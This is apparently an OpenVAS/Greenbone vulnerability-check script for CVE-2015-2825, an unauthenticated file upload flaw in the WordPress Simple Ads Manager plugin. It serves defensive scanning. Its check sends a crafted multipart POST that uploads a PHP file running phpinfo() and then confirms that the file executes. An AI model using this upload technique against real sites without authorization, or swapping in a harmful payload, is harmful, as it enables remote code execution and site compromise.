CPE = "cpe:/a:wordpress:wordpress";
if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805530" );
	script_version( "2020-11-19T14:17:11+0000" );
	script_cve_id( "CVE-2015-2825" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2020-11-19 14:17:11 +0000 (Thu, 19 Nov 2020)" );
	script_tag( name: "creation_date", value: "2015-04-08 18:02:38 +0530 (Wed, 08 Apr 2015)" );
	script_tag( name: "qod_type", value: "exploit" );
	script_name( "WordPress Simple Ads Manager Plugin File Upload Vulnerability" );
	script_tag( name: "summary", value: "The host is installed with WordPress
  Simple Ads Manager Plugin and is prone to arbitrary file upload vulnerability." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP POST request
  and check whether it is able to upload file or not." );
	script_tag( name: "insight", value: "The flaw exists because the sam-ajax-admin.php
  script does not properly verify or sanitize user-uploaded files passed via
  the 'path' parameter." );
	script_tag( name: "impact", value: "Successful exploitation will allow an
  unauthenticated remote attacker to upload files in an affected site." );
	script_tag( name: "affected", value: "WordPress Simple Ads Manager Plugin
  version 2.5.94." );
	script_tag( name: "solution", value: "Update to WordPress Simple Ads Manager
  Plugin version 2.6.96 or later." );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_xref( name: "URL", value: "http://www.exploit-db.com/exploits/36614" );
	script_xref( name: "URL", value: "http://www.itas.vn/news/ITAS-Team-found-out-multiple-critical-vulnerabilities-in-Hakin9-IT-Security-Magazine-78.html?language=en" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "secpod_wordpress_detect_900182.sc" );
	script_mandatory_keys( "wordpress/installed" );
	script_require_ports( "Services/www", 80 );
	script_xref( name: "URL", value: "https://profiles.wordpress.org/minimus" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("host_details.inc.sc");
require("misc_func.inc.sc");
if(!http_port = get_app_port( cpe: CPE )){
	exit( 0 );
}
if(!dir = get_app_location( cpe: CPE, port: http_port )){
	exit( 0 );
}
if(dir == "/"){
	dir = "";
}
host = http_host_name( port: http_port );
url = dir + "/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";
wpReq = http_get( item: url, port: http_port );
wpRes = http_keepalive_send_recv( port: http_port, data: wpReq, bodyonly: FALSE );
if(wpRes && IsMatchRegexp( wpRes, "^HTTP/1\\.[01] 200" )){
	url = dir + "/wp-content/plugins/simple-ads-manager/sam-ajax-admin.php";
	vtstrings = get_vt_strings();
	useragent = http_get_user_agent();
	fileName = vtstrings["lowercase_rand"] + ".php";
	postData = NASLString( "-----------------------------18047369202321924582120237505\r\n", "Content-Disposition: form-data; name=\"path\"\r\n\r\n\r\n", "-----------------------------18047369202321924582120237505\r\n", "Content-Disposition: form-data; name=\"uploadfile\"; filename=\"", fileName, "\"\r\n", "Content-Type: text/html", "\r\n\r\n", "<?php phpinfo(); unlink( \"", fileName, "\" ); ?>\r\n\r\n", "-----------------------------18047369202321924582120237505\r\n", "Content-Disposition: form-data; name=\"action\"\r\n\r\n", "upload_ad_image\r\n", "-----------------------------18047369202321924582120237505--" );
	wpReq = NASLString( "POST ", url, " HTTP/1.1\\r\\n", "Host: ", host, "\\r\\n", "User-Agent: ", useragent, "\\r\\n", "Content-Type: multipart/form-data; boundary=---------------------------18047369202321924582120237505\\r\\n", "Content-Length: ", strlen( postData ), "\\r\\n", "\\r\\n", postData );
	wpRes = http_keepalive_send_recv( port: http_port, data: wpReq );
	if(ContainsString( wpRes, "success" ) && IsMatchRegexp( wpRes, "^HTTP/1\\.[01] 200" )){
		url = dir + "/wp-content/plugins/simple-ads-manager/" + fileName;
		if(http_vuln_check( port: http_port, url: url, check_header: TRUE, pattern: ">phpinfo\\(\\)<", extra_check: ">System" )){
			if(http_vuln_check( port: http_port, url: url, check_header: FALSE, pattern: "^HTTP/1\\.[01] 200" )){
				report = "\\nUnable to delete the uploaded File at " + url + "\\n";
			}
			if( report ){
				security_message( data: report, port: http_port );
			}
			else {
				security_message( port: http_port );
			}
			exit( 0 );
		}
	}
}

